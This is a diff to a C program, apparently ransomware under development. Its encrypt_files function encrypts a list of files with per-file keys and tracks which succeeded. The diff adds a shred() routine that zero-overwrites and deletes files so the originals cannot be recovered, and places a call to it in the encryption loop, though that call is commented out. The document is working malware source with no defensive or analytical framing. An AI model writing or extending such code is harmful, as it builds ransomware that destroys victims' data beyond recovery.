@@ -6,6 +6,12 @@
 #include<stdlib.h>
 #include<openssl/evp.h>
 #include<openssl/aes.h>
+#define BUF_SIZE 4096
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <string.h>
+#include <unistd.h>
 
 
 /**
@@ -44,12 +50,45 @@ void encrypt_files(List *files, List **encrypted, List **not_encrypted){
             fclose(old);
             free(key);
             free(iv);
-            //remove(files->path); // delete the original file
+            //shred(files->info[2]);
 
         }else    append(not_encrypted, files->info[2], NULL, NULL);
 
         files = files->prox;
     }
+}
+
+/**
+ * This function shred and delete the file.
+ * There's no way recovering the old files.
+ * @param path -> type = char * (String)
+ */
+void shred(char *path){
+    //get file size
+    struct stat stat_buf;
+    if (stat(path, &stat_buf) == -1)
+        return;
+    off_t fsize = stat_buf.st_size;
+
+    int fd = open(path, O_WRONLY);
+    if (fd == -1)
+        return;
+
+    void *buf = malloc(BUF_SIZE);
+    memset(buf, 0, BUF_SIZE);
+    ssize_t ret = 0;
+    off_t shift = 0;
+    while((ret = write(fd, buf,
+                       ((fsize - shift >BUF_SIZE)?
+                       BUF_SIZE:(fsize - shift)))) > 0)
+        shift += ret;
+    
+    close(fd);
+    free(buf);
+    if (ret == -1)
+        return;
+    
+    remove(path);
 }
 
 /**
